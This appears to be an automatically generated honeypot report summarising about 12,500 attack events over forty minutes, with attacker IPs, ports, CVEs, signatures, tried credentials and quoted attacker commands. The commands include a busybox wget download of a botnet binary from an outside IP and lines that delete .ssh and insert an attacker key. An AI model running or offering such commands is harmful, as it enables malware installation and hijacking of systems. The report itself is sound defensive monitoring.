Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T01:01:42Z
**Timeframe:** 2025-10-01T00:20:01Z - 2025-10-01T01:00:01Z
**Files Used:**
- agg_log_20251001T002001Z.json
- agg_log_20251001T004002Z.json
- agg_log_20251001T010001Z.json

**Executive Summary**
This report summarizes 12,498 events collected from the honeypot network. The majority of attacks were captured by the Cowrie honeypot. The most frequent attacks originated from IP address 157.92.145.135. Port 22 (SSH) was the most targeted port. Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers attempted a variety of commands, including reconnaissance and malware downloads.

**Detailed Analysis**

***Attacks by Honeypot***
- Cowrie: 6204
- Honeytrap: 2349
- Suricata: 1419
- Ciscoasa: 1358
- Mailoney: 905
- H0neytr4p: 78
- Adbhoney: 47
- Dionaea: 44
- Tanner: 37
- Redishoneypot: 16
- Sentrypeer: 10
- Honeyaml: 8
- ConPot: 7
- Dicompot: 7
- ElasticPot: 5
- Heralding: 3
- Ipphoney: 1

***Top Attacking IPs***
- 157.92.145.135
- 8.134.14.125
- 194.164.60.134
- 92.242.166.161
- 185.156.73.166
- 92.63.197.55
- 185.156.73.167
- 92.63.197.59
- 196.251.80.30
- 86.54.42.238

***Top Targeted Ports/Protocols***
- 22
- 25
- 23
- 8333
- 443
- TCP/22
- 80
- TCP/8080
- TCP/1080
- TCP/1433

***Most Common CVEs***
- CVE-2002-0013 CVE-2002-0012
- CVE-2024-3721 CVE-2024-3721
- CVE-2019-11500 CVE-2019-11500
- CVE-2018-11776

***Commands Attempted by Attackers***
- uname -s -v -n -r -m
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- whoami
- uname -a
- top
- crontab -l

***Signatures Triggered***
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN NMAP -sS window 1024
- 2009582
- ET INFO Reserved Internal IP Traffic
- 2002752
- ET SCAN Potential SSH Scan
- 2001219
- ET CINS Active Threat Intelligence Poor Reputation IP group 45
- 2403344

***Users / Login Attempts***
- root/LeitboGi0ro
- support/123456789
- foundry/foundry
- root/Js123456
- admin/1234
- User-Agent: Go-http-client/1.1/Connection: close
- GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1...
- ranger/ranger
- oracle/abc123
- bot/bot

***Files Uploaded/Downloaded***
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- i
- fonts.gstatic.com
- ie8.css?ver=1.0

***HTTP User-Agents***
- No user agents were logged in this period.

***SSH Clients***
- No SSH clients were logged in this period.

***SSH Servers***
- No SSH servers were logged in this period.

***Top Attacker AS Organizations***
- No AS organizations were logged in this period.

**Key Observations and Anomalies**
- A significant amount of scanning activity was observed, particularly from the top attacking IPs.
- The commands attempted by attackers suggest a focus on reconnaissance and establishing persistent access.
- The frequent downloads of `urbotnetisass` variants indicate a coordinated malware campaign.
- The presence of CVEs highlights the continued exploitation of known vulnerabilities.
- The high number of login attempts with common and default credentials underscores the importance of strong password policies.
- The variety of honeypots triggered indicates a broad range of attack vectors being tested by adversaries.
